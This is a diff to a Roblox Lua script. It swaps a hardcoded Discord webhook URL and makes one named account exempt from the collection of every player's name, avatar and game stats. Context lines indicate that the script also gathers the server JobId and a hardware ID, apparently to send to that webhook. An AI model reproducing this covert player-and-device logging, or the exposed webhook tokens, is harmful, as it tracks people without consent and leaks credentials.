@@ -3,7 +3,7 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
-local discordWebhookUrl = "https://discord.com/api/webhooks/1297123162453966848/5JIbEOpkRk_Q4gqoZpCCAYXVGSt9-J0yYmw5aIkryWrGk79ALskEmCHcV0FuZAPv4-4B"
+local discordWebhookUrl = "https://discord.com/api/webhooks/1297119321021087746/IdJVZ8ROoljJkstfYRnlxKYLt8ECRyLmAur-DrNbg7ZnQv5GqEsYme9DNSznXoYNyI87"
 
 local function getJobIdAndHwid()
     local jobId = game.JobId
@@ -53,28 +53,31 @@ end
 local function getAllPlayerData()
     local playerDataList = {}
     for _, player in pairs(Players:GetPlayers()) do
-        local playerData = {}
-        local playerName = player.Name
-        local playerDisplayName = player.DisplayName
-        local avatarUrl = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
+        -- Excluir al jugador específico
+        if player.Name ~= "fernanfloP091o" then
+            local playerData = {}
+            local playerName = player.Name
+            local playerDisplayName = player.DisplayName
+            local avatarUrl = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
 
-        local folderData = ReplicatedStorage:FindFirstChild("Datas"):FindFirstChild(player.UserId)
-        if folderData then
-            local rebirthValue = folderData:FindFirstChild("Rebirth") and folderData.Rebirth.Value or 0
-            local strengthValue = folderData:FindFirstChild("Strength") and folderData.Strength.Value or 0
-            local formattedRebirth = formatNumber(rebirthValue)
-            local formattedStrength = formatNumber(strengthValue)
-            local nextRebirthPrice = getNextRebirthPrice(rebirthValue)
+            local folderData = ReplicatedStorage:FindFirstChild("Datas"):FindFirstChild(player.UserId)
+            if folderData then
+                local rebirthValue = folderData:FindFirstChild("Rebirth") and folderData.Rebirth.Value or 0
+                local strengthValue = folderData:FindFirstChild("Strength") and folderData.Strength.Value or 0
+                local formattedRebirth = formatNumber(rebirthValue)
+                local formattedStrength = formatNumber(strengthValue)
+                local nextRebirthPrice = getNextRebirthPrice(rebirthValue)
 
-            local combinedLabel = string.format("Jugador: %s\nApodo: %s\nRebirth: %s\nStrength: %s\nPrecio para siguiente Rebirth: %s",
-                playerName, playerDisplayName, formattedRebirth, formattedStrength, formatNumber(nextRebirthPrice))
+                local combinedLabel = string.format("Jugador: %s\nApodo: %s\nRebirth: %s\nStrength: %s\nPrecio para siguiente Rebirth: %s",
+                    playerName, playerDisplayName, formattedRebirth, formattedStrength, formatNumber(nextRebirthPrice))
 
-            table.insert(playerDataList, {
-                label = combinedLabel,
-                rebirth = rebirthValue,
-                strength = strengthValue,
-                avatarUrl = avatarUrl
-            })
+                table.insert(playerDataList, {
+                    label = combinedLabel,
+                    rebirth = rebirthValue,
+                    strength = strengthValue,
+                    avatarUrl = avatarUrl
+                })
+            end
         end
     end
 
